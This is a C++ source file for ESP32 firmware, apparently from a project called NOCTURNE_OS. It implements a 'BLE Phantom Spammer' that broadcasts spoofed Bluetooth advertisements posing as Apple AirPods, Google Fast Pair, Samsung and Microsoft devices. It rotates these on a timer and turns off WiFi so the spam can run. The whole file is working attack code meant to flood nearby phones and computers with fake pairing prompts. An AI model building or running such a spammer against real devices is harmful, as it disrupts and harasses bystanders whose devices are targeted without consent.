/*
 * NOCTURNE_OS — BLE Phantom Spammer: rotate Apple / Google / Samsung payloads.
 * Builds with or without NimBLE: if NimBLEDevice.h is not found, BLE is a
 * no-op.
 */
#include "BleManager.h"
#include <Arduino.h>
#include <WiFi.h>
#if __has_include("NimBLEDevice.h")
#include "NimBLEDevice.h"
#include <string>
#include <vector>

// Apple AirPods — полный формат manufacturer data (31 байт, 0x004C)
// Формат: 0x1e (length), 0xff (AD type), 0x4c 0x00 (Apple ID), затем данные
// устройства Byte 7 определяет модель: 0x02=Gen1, 0x0e=Pro, 0x14=Pro Gen2
static const uint8_t kPayloadApple[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const size_t kPayloadAppleLen = sizeof(kPayloadApple);

// Google Fast Pair — Service Data UUID 0xFE2C (не используется как константа,
// создается динамически) Model ID placeholder: 3 bytes (0x00, 0x00, 0x00)

// Samsung (SmartTag / Buds) — manufacturer 0x0075
static const uint8_t kPayloadSamsung[] = {0x75, 0x00, 0x01, 0x02, 0x03, 0x04};
static const size_t kPayloadSamsungLen = sizeof(kPayloadSamsung);

// Windows (Microsoft Surface / другие устройства) — manufacturer 0x0006
static const uint8_t kPayloadWindows[] = {0x06, 0x00, 0x01, 0x02, 0x03, 0x04};
static const size_t kPayloadWindowsLen = sizeof(kPayloadWindows);
#endif

BleManager::BleManager() {}

void BleManager::setPayload(int index) {
#if __has_include("NimBLEDevice.h")
  if (!active_ || !NimBLEDevice::getInitialized()) {
    Serial.println("[PHANTOM] Cannot set payload - BLE not active");
    return;
  }

  // Валидация индекса
  if (index < 0 || index >= BLE_PHANTOM_PAYLOAD_COUNT) {
    Serial.printf("[PHANTOM] Invalid payload index %d, using 0\n", index);
    index = 0;
  }

  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  if (pAdvertising == nullptr) {
    Serial.println("[PHANTOM] ERROR: Advertising object is null");
    return;
  }

  // Остановка предыдущей рекламы
  pAdvertising->stop();
  yield(); // Allow BLE stack to process stop command

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);

  switch (index) {
  case 0: // Apple AirPods
  {
    std::vector<uint8_t> appleData(kPayloadApple,
                                   kPayloadApple + kPayloadAppleLen);
    advData.setManufacturerData(appleData);
  } break;
  case 1: // Google Fast Pair - используем Service Data с UUID 0xFE2C
  {
    NimBLEUUID serviceUUID((uint16_t)0xFE2C);
    // Model ID (3 bytes) - используем валидный debug Model ID для разработчиков
    // В production можно использовать случайный или зарегистрированный Model ID
    std::string fastPairData;
    fastPairData.push_back(0xcd); // Model ID byte 0
    fastPairData.push_back(0x82); // Model ID byte 1
    fastPairData.push_back(0x56); // Model ID byte 2 (пример из документации)
    advData.setServiceData(serviceUUID, fastPairData);
  } break;
  case 2: // Samsung
  {
    std::vector<uint8_t> samsungData(kPayloadSamsung,
                                     kPayloadSamsung + kPayloadSamsungLen);
    advData.setManufacturerData(samsungData);
  } break;
  case 3: // Windows (Microsoft)
  {
    std::vector<uint8_t> windowsData(kPayloadWindows,
                                     kPayloadWindows + kPayloadWindowsLen);
    advData.setManufacturerData(windowsData);
  } break;
  default: {
    std::vector<uint8_t> appleData(kPayloadApple,
                                   kPayloadApple + kPayloadAppleLen);
    advData.setManufacturerData(appleData);
  } break;
  }

  pAdvertising->setAdvertisementData(advData);

  // Запуск рекламы с проверкой ошибок
  if (!pAdvertising->start(0, nullptr)) {
    Serial.println("[PHANTOM] ERROR: Failed to start advertising");
    return;
  }

  packetCount_++;
  currentPayloadIndex_ = index;
#else
  (void)index;
#endif
}

void BleManager::startSpam() {
#if __has_include("NimBLEDevice.h")
  setPayload(0);
#endif
}

void BleManager::begin() {
  // Проверка состояния WiFi перед запуском BLE (вне условной компиляции)
  wifi_mode_t wifiMode = WiFi.getMode();
  if (wifiMode != WIFI_OFF) {
    Serial.println("[PHANTOM] WARNING: WiFi not off, attempting to disable...");
    WiFi.disconnect(true);
    yield(); // Allow WiFi stack to process disconnect
    WiFi.mode(WIFI_OFF);
    yield(); // Allow WiFi mode change to complete
    wifiMode = WiFi.getMode();
    if (wifiMode != WIFI_OFF) {
      Serial.println(
          "[PHANTOM] ERROR: Failed to disable WiFi, BLE may not work");
      return;
    }
  }

#if __has_include("NimBLEDevice.h")
  if (active_) {
    Serial.println("[PHANTOM] BLE already active");
    return;
  }

  // Инициализация NimBLE
  if (!NimBLEDevice::getInitialized()) {
    NimBLEDevice::init("PHANTOM");
    yield(); // Allow BLE stack to initialize
  }

  if (!NimBLEDevice::getInitialized()) {
    Serial.println("[PHANTOM] ERROR: NimBLE initialization failed");
    active_ = false;
    return;
  }

  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  if (pAdvertising == nullptr) {
    Serial.println("[PHANTOM] ERROR: Failed to get advertising object");
    active_ = false;
    return;
  }

  pAdvertising->setScanResponse(false);
  startSpam();
  active_ = true;
  lastRotateMs_ = millis();
  Serial.println("[PHANTOM] BLE spam ACTIVE (WiFi off).");
#else
  Serial.println("[PHANTOM] BLE not available (NimBLE not found).");
  active_ = false;
#endif
}

void BleManager::stop() {
#if __has_include("NimBLEDevice.h")
  if (!active_) {
    return;
  }

  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  if (pAdvertising != nullptr) {
    pAdvertising->stop();
    yield(); // Allow BLE stack to process stop command
  }

  if (NimBLEDevice::getInitialized()) {
    NimBLEDevice::deinit(true);
    yield(); // Allow BLE stack to deinitialize
  }

  active_ = false;
  packetCount_ = 0;
  currentPayloadIndex_ = 0;
  Serial.println("[PHANTOM] BLE spam STOPPED.");
#else
  active_ = false;
#endif
}

void BleManager::tick() {
#if __has_include("NimBLEDevice.h")
  if (!active_)
    return;

  // Проверка состояния BLE
  if (!NimBLEDevice::getInitialized()) {
    Serial.println("[PHANTOM] BLE deinitialized, stopping...");
    active_ = false;
    return;
  }

  unsigned long now = millis();
  if (now - lastRotateMs_ >= BLE_PHANTOM_ROTATE_MS) {
    lastRotateMs_ = now;
    int next = (currentPayloadIndex_ + 1) % BLE_PHANTOM_PAYLOAD_COUNT;

    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    if (pAdvertising != nullptr) {
      pAdvertising->stop();
      yield(); // Allow BLE stack to process stop command
    }

    setPayload(next);
  }
#endif
}
